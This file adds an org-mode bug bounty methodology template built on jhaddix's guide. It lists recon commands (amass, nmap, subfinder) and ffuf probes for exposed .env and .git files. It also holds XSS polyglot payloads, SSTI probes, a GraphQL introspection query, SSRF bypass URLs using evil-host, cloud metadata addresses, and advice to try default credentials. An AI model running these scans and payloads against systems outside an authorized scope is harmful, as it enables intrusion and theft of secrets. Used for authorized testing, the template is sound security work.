@@ -1,0 +1,585 @@
+:PROPERTIES:
+:ID:       c5112feb-9a35-4bd0-8406-0e8358b2c07a
+:END:
+#+title: bug bounty methods
+#+CREATED: [2023-11-07 Tue 09:35]
+#+LAST_MODIFIED: [2023-12-09 Sat 09:35]
+#+STARTUP: overview
+
++ Version: 0.4
+* About
+Some of this is stolen from jhaddix as a seed to start my own.
+jhaddix Would like to say thank you for some of your tips you have given online
+
+This is also a template so be sure to copy this!
+
+Some other links
++ https://github.com/jhaddix/tbhm/tree/master
++ https://owasp.org/www-project-web-security-testing-guide/v42/
+
+** Where to put outputs?
+Outputs of the steps here are ment to be put in the same heading or under a "finding" heading.
+Scan results go into PWD/scans/<date>/tool/output
+
+
+
+
+
+* Setup
+Copy This to hackmode working dir.
+#+begin_src emacs-lisp
+(let ((this buffer-file-name)
+      (path (hackmode-get-operation-path hackmode-operation)))
+  (f-copy this (f-join path "steps.org")))
+#+end_src
+
+#+RESULTS:
+
+Download fresh proxy chains config to my working dir
+This is from my node red setup.
+#+begin_src shell :results silent
+curl http://10.50.50.18:1880/proxychain --output proxychains.conf -silent
+#+end_src
+
+
+** Scope
+
+
+#+NAME: SCOPE
+| target | In Scope (True or false) | Notes if any |
+|--------+--------------------------+--------------|
+|        |                          |              |
+Some code to export t
+#+begin_src elisp :var tbl=SCOPE :file targets.txt :results value file :file  targets.txt :exports results
+
+(mapconcat 'identity  (cl-loop for entry in tbl
+                              if (s-contains? "true" (downcase (nth 1 entry)))
+                              collect (format "%s" (nth 0 entry))) "\n")
+
+#+end_src
+
+
+Set lisp scope var
+#+begin_src lisp :session hackmode :var tbl=SCOPE
+(setq *scope* (loop for entry in tbl
+                   if (str:containsp "true" (downcase (nth 1 entry)))
+                     collect (format "~a" (nth 0 entry))))
+#+end_src
+
+
+Submit targets to scanning automation.
+#+begin_src sh  :results output replace var filename="targets.txt" var scope=True
+#!/bin/bash
+if [ -e "$filename" ]; then
+    while IFS= read -r line; do
+        curl http://10.50.50.18:1880/target/scan -d "{\"target\": \"$line\"}" -H "Content-Type: application/json"
+    done < "$filename"
+else
+    echo "File $filename not found."
+fi
+
+#+end_src
+
+
+
+Hackerone scope import
+#+begin_src elisp :var tbl=SCOPE :file targets.txt
+
+
+(dolist (entry (cl-loop for entry in tbl
+                        if (str:contains "true" (downcase (nth 4 entry)))
+                        collect (cons (nth 1 entry) (nth 0 entry))))
+  (let ((value (cdr entry)))
+    (when (stringp (car entry))
+      (let ((file-name (car entry)))
+        (with-temp-buffer
+          (insert (concat value "\n"))
+          (append-to-file (point-min) (point-max) (format "%s.txt" file-name)))))))
+
+
+;; (dolist (entry (cl-loop for entry in tbl
+;;                 if (s-contains? "true" (downcase (nth 4 entry)))
+;;                 collect (cons (nth 1 entry) (nth 0 entry))))
+;;   (let ((value (cdr entry)))
+;;     (message "%s"  entry)
+;;     (when (stringp (car entry))
+;;       (let ((file-name (car entry)))
+;;         (with-temp-file (format "%s.txt" file-name)
+;;           (insert (cdr entry) "\n"))))))
+
+
+#+end_src
+
+
+Hackerone set lisp scope var
+#+begin_src lisp :session=hackmode :var tbl=SCOPE
+(setq *scope-alist* (loop for entry in tbl
+                   if (str:containsp "true" (downcase (nth 4 entry)))
+                     collect (cons (nth 1 entry) (nth 0 entry))))
+(defun get-scope-type (type)
+  (loop for (key value) in *scope*
+        if (string-equal (downcase type) key)
+          collect value))
+
+#+end_src
+
+#+begin_src lisp :session=hackmode :var scope-type="domain"
+(setq *scope* (get-scope-type scope-type))
+#+end_src
+
+
+* TODO Recon [0/7] :recon:
+** TODO Apex Domains :dns:
+*** TODO Check mdi :apex:
+
+*** TODO Reverse Whois :whois:
+*** TODO Spider :spider:
+Spidering can find other apex domains
+
+
+** TODO BBOT
+#+begin_src sh :async t :results none
+/home/unseen/Documents/hackmode-tools/bbot.sh ./targets.txt
+#+end_src
+** TODO IP :ip:
+
+*** TODO ASN [0/2]
++ [ ] https://bgp.he.net/
++ [ ] BBOT
++ [ ] https://hackertarget.com/as-ip-lookup/
+
+**** TODO Ammas
+#+NAME: ORGS
+| Org Names |
+|-----------|
+|           |
+
+#+begin_src sh :async :var tbl=ORGS :results output replace
+for org in "$tbl"; do
+ amass intel -org "$org"
+done
+#+end_src
+
+#+RESULTS:
+
+*** TODO Nmap
+maybe find an admin panel or something?
+
+#+begin_src sh :async :results output replace
+nmap -A -iL targets.txt
+#+end_src
+*** TODO Naabu ASN port scan :active::ports:
+
+
+
+** TODO Sub domains [0/6]
+*** TODO Amass
+
+#+begin_src sh :async :var tbl= :results output replace
+file="targets.txt"
+if [ -e "$file" ]; then
+    while IFS= read -r line; do
+        amass enum -rf ~/wordlists/resolvers/resolvers.txt -d "$line" -ip -active
+    done < "$file"
+else
+    echo "File $file not found."
+fi
+#+end_src
+*** TODO Hackmode
+#+NAME: hackmode-subfinder
+#+begin_src lisp :session hackmode :results output-replace :file "hackmode-subfinder.txt"
+(defun bulk-subfinder (lst)
+  (remove-duplicates (hackmode:flatten (lparallel:pmap 'list (lambda (domain)
+                                                               (hackmode:domain-name (recon.dns:subfinder* "-d" domain))) lst))))
+(setq *subfinder-results* (bulk-subfinder *scope*))
+(loop for domain in *subfinder-results*
+      do (push domain *domains*)
+      do (format t "~a~%" domain))
+#+end_src
+
+#+begin_src shell :async t
+cat hackmoder-subfinder.txt | anewer subdomains.txt
+#+end_src
+
+
+*** TODO Subfinder
+Subfinder here may or may not find stuff
+
+#+begin_src sh :async
+subfinder -dl targets.txt -o subfinder.txt
+#+end_src
+
+#+begin_src shell :async t
+cat subfinder.txt | anewer subdomains.txt
+#+end_src
+
+
+
+
+*** TODO Dorking
+*** TODO Nmap on found subdomains
+
+#+begin_src sh :async :results output replace
+nmap -A -iL subdomains.txt
+#+end_src
+*** TODO Github subdomains
+#+begin_src shell :async t
+while IFS= read -r domain; do github-subdomains -o "github-subdomains.txt" -t .tokens -d "$domain"; done < subdomains.txt
+
+#+end_src
+
+** TODO Osint [0/3]
+Start maltego
+#+begin_src sh :async t :results none
+maltego
+#+end_src
+
++ [ ] Aleph
++ [ ] OCCRP
++ [ ] Chunkbase
+
+*** TODO Acquisitions
+*** TODO Tech Workers
+*** TODO Tech stack
+*** TODO Software versions
+*** TODO Github [0/3]
+**** TODO Make List of public repos
+#+NAME: FOSS-REPOS
+| Name | Link |
+|------+------|
+|      |      |
+**** TODO User listing
+This is related to tech workers but this time going into detail of their github accounts.
+**** TODO Truffel APi
+
+
+
+
+** TODO Find api urls
+** TODO Ffuf Dir search
+
+#+NAME: dirbust-config
+#+begin_src conf
+[http]
+    recursion=true
+[general]
+    threads = 24
+
+#+end_src
+
+#+BEGIN_SRC ffuf :wordlist-files '("~/wordlists/Discovery/Web-Content/big.txt:FUZZ" "./targets.txt:HOST") :config-block dirbust-config
+GET http://HOST/FUZZ HTTP/1.1
+Host: HOST
+User-Agent: Discordbot
+Accept: text/html
+Accept-Language: en-US
+Connection: keep-alive
+#+END_SRC
+
+** TODO [#A] Easy Freebies [0/2]
+*** TODO Exposed git/json/env?
+config.json?
+#+BEGIN_SRC ffuf :wordlist-files '("./targets.txt:FUZZ")
+GET http://FUZZ/config.json HTTP/1.1
+Host: FUZZ
+User-Agent: Discordbot
+Accept: text/html
+Accept-Language: en-US
+Connection: keep-alive
+#+END_SRC
+
+.env?
+#+BEGIN_SRC ffuf :wordlist-files '("./targets.txt:FUZZ")
+GET http://FUZZ/.env HTTP/1.1
+Host: FUZZ
+User-Agent: Discordbot
+Accept: text/html
+Accept-Language: en-US
+Connection: keep-alive
+#+END_SRC
+
+.git/config?
+
+#+BEGIN_SRC ffuf :wordlist-files '("./targets.txt:FUZZ")
+GET http://FUZZ/.git/config HTTP/1.1
+Host: FUZZ
+User-Agent: Discordbot
+Accept: text/html
+Accept-Language: en-US
+Connection: keep-alive
+#+END_SRC
+
+
+git head?
+#+BEGIN_SRC ffuf :wordlist-files '("./targets.txt:FUZZ")
+GET http://FUZZ/.git/HEAD HTTP/1.1
+Host: FUZZ
+User-Agent: Discordbot
+Accept: text/html
+Accept-Language: en-US
+Connection: keep-alive
+#+END_SRC
+*** TODO Leakix
+
+
+
+
+* TODO Content Discovery [0/6 ] :discovery::recon:
+** TODO FFUF
+Use ffuf to find content and dirs
+** TODO Wayback machine
+** TODO robots.txt and sitemap
+** TODO Google Dorking
+** TODO Common Crawl
+** TODO Sipder crawling :apex:
+Also look for apex domains
+
+* TODO Security_Misconfiguration [0/4]
++ [ ] https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
+
++ [ ] Look online for default creds (use them)
+
++ [ ] Note default from docuementation
+
++ [ ] Check for stack traces
+
+
+* TODO Vunerable Components [0/2]
+
++ it is very likly that unless they are not 100% aware of all the components they use server side and client.
++ [ ] Search Github/online for kwnown cves of the version
++ [ ] Search for its deps?
+
+
+
+* TODO XSS [0/4]
++ Roam: [[id:524a19f0-d6e9-4785-9f8d-262495410c08][XSS]]
++ https://github.com/wisec/domxsswiki/wiki/
++ http://www.webappsec.org/projects/articles/071105.html
+Core Idea: Does the page functionality display something to the users? For time sensitive testing the 80/20 rule applies. Many testers use Polyglot payloads. You probably have too!
+** TODO *Multi-context, filter bypass based polyglot payload #1 (Rsnake XSS Cheat Sheet)
+#+begin_src html
+';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
+
+#+end_src
+** TODO Multi-context, filter bypass based polyglot payload #2 (Ashar Javed XSS Research)
+#+begin_src html
+">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="https ://www.memeatlas.com/images/misc/arnold-true-lies-mask.jpg">
+
+#+end_src
+** TODO Multi-context polyglot payload (Mathias Karlsson)
+#+begin_src html
+" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
+
+#+end_src
+** Jhaddix's observations
+Input Vectors:
+- Customizable Themes & Profiles via CSS
+- Event or meeting names
+- URI based
+- Imported from a 3rd party (think Facebook integration)
+- JSON POST Values (check returning content type)
+- File Upload names
+- Uploaded files (swf, HTML, ++)
+- Custom Error pages
+- fake params - ?realparam=1&foo=bar’+alert(/XSS/)+’
+- Login and Forgot password forms
+
+Common Params:
+onload, allowedDomain, movieplayer, xmlPath, eventhandler, callback (more on OWASP page)
+
+** Payloads
+
+#+begin_example
+\%22})))}catch(e){alert(document.domain);}//
+"]);}catch(e){}if(!self.a)self.a=!alert(document.domain);//
+"a")(({type:"ready"}));}catch(e){alert(1)}//
+#+end_example
+
+
+* TODO [#A] SQLI [0/5]
++ [ ] Roam: [[id:81d62666-4ce8-4244-b498-739a680f9673][SQL Injection]]
++ [ ] Roam: [[id:ef03bc97-55a3-44e6-b24a-523630f0090d][SQLMap]]
++ [ ] Use tampers to get around blacklists
++ [ ] SqliPy can be used to script it
++ [ ] Error based is unlikly to occur.
+
+* TODO GraphQL
++ Roam: [[id:25fc721e-5b9f-466f-b1d6-73a0db092853][GraphQl]]
++ https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696
++ https://portal.helloworks.com/api/graphql
+
+** Payloads
+
+Introspection
+#+begin_src graphql
+query IntrospectionQuery {
+  __schema {
+    queryType {
+      name
+    }
+    mutationType {
+      name
+    }
+    subscriptionType {
+      name
+    }
+    types {
+      ...FullType
+    }
+    directives {
+      name
+      description
+      locations
+      args {
+        ...InputValue
+      }
+    }
+  }
+}
+fragment FullType on __Type {
+  kind
+  name
+  description
+  fields(includeDeprecated: true) {
+    name
+    description
+    args {
+      ...InputValue
+    }
+    type {
+      ...TypeRef
+    }
+    isDeprecated
+    deprecationReason
+  }
+  inputFields {
+    ...InputValue
+  }
+  interfaces {
+    ...TypeRef
+  }
+  enumValues(includeDeprecated: true) {
+    name
+    description
+    isDeprecated
+    deprecationReason
+  }
+  possibleTypes {
+    ...TypeRef
+  }
+}
+fragment InputValue on __InputValue {
+  name
+  description
+  type {
+    ...TypeRef
+  }
+  defaultValue
+}
+fragment TypeRef on __Type {
+  kind
+  name
+  ofType {
+    kind
+    name
+    ofType {
+      kind
+      name
+      ofType {
+        kind
+        name
+        ofType {
+          kind
+          name
+          ofType {
+            kind
+            name
+            ofType {
+              kind
+              name
+              ofType {
+                kind
+                name
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+#+end_src
+
+* TODO SSTI [0/0]
++ Roam: [[id:04f89216-71ef-4627-91c6-138e7c3cc533][SSTI]]
+
+** TODO tools [/]
+- https://github.com/epinna/tplmap.git
+** TODO Payloads
+Common payloads
+#+begin_example
+a{{bar}}b
+a{{7*7}}
+{var} ${var} {{var}} <%var%> [% var %]
+#+end_example
+
+
+* TODO CSRF
++ Roam: [[id:4312a6c1-a0e8-42b3-8f63-16de99ec3f39][Cross Site request forgery]]
+
+
+
+* TODO SSRF
++ Roam: [[id:7fbb6131-0ea0-4863-a55c-6a4fd364e522][SSRF]]
++ https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf
++ https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf
++ https://portswigger.net/web-security/ssrf
+
+
+#+DOWNLOADED: screenshot @ 2023-11-07 09:36:30
+[[file:SSRF/2023-11-07_09-36-30_screenshot.png]]
+
+** TODO [#A] File Descriptors
+This is usful in clouds or chared hosting, remeber the remote htop fuzzer!
+if it is a interpeted env, try and use their wrapper
+
++ fd:// for php
+
+** TODO common bypasses  [0/4]
++ [ ] Use and altnertive IP representation of 127.0.0.1, 2130706433, 017700000001, or 127.1.
++ [ ] Use your own domain, spoofed.burpcollaborator.net also works
++ [ ] Obfuscate blocked strings using URL encoding or case variation.
+
++ [ ]  Provide a URL that you control, which redirects to the target URL. Try using different redirect codes, as well as different protocols for the target URL. For example, switching from an http: to https: URL during the redirect has been shown to bypass some anti-SSRF filters.
+
+** TODO Whitelisted bypasses [0/6]
++ [ ] You can embed credentials in a URL before the hostname, using the @ character. https://expected-host:fakepassword@evil-host
++ [ ] https://evil-host#expected-host
++ [ ] You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example: https://expected-host.evil-host
+
++ [ ] You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request. You can also try double-encoding characters; some servers recursively URL-decode the input they receive, which can lead to further discrepancies.
+
+
+
++ [ ] Use all of the above
+
+** TODO Bypass via open redirect
+i have seen something like this before on freshworks.
+Basicly where there is a open redirect bug you can use that Vulnerable endpoint as a payload
+
+example
+#+begin_example
+/path/?api=https://open.redirect
+#+end_example
+#+begin_src http
+POST /data
+
+api=http://example.com/path/?api=https://open.redirect
+#+end_src
+
+** TODO [#A] Get instance metadata
+Get the instance metadata
+#+begin_example
+http://169.254.169.254/
+#+end_example
